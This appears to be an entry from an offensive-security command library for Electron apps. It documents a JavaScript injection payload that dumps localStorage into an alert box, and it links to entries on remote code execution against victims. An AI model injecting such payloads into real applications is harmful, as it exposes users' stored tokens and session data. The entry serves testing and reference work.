---
data: alert(JSON.stringify(localStorage))
tags:
  - data-leak
  - javascript
type: command
executor: javascript
platforms:
  - Electron
id: 0315251b-d928-43c7-a9da-d9063630c63b
created_at: '2025-12-11T06:10:22.485Z'
updated_at: '2025-12-11T06:10:22.485Z'
verified: false
validated: true
submitted: true
---
# alert-localstorage

## Command

```javascript
alert(JSON.stringify(localStorage))
```

## Description

Displays the contents of localStorage in an alert for data exfiltration without full RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | N/A | No |

## Examples

### Basic Usage

```javascript
alert(JSON.stringify(localStorage))
```

## Expected Output

Alert box showing JSON string of localStorage contents.

## Related

- [[commands/exec-shell-command-nodejs]]
- [[procedures/Execute-RCE-on-Victim-Interaction]]
